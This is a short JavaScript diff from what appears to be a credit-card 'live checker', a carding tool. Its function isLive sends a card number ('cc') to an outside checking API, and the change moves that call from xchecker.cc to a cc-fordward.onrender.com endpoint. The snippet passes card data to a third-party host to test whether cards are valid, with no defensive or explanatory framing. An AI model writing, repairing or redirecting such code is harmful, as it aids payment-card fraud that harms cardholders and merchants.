@@ -96,7 +96,7 @@ document.addEventListener('DOMContentLoaded', function () {
 });
 
 function isLive(kardo){
-   axios.get(`https://xchecker.cc/api.php?cc=${kardo}`).then((res) => {
+   axios.get(`https://cc-fordward.onrender.com/check?cc=${kardo}`).then((res) => {
         console.log(res.data)
     })
 }
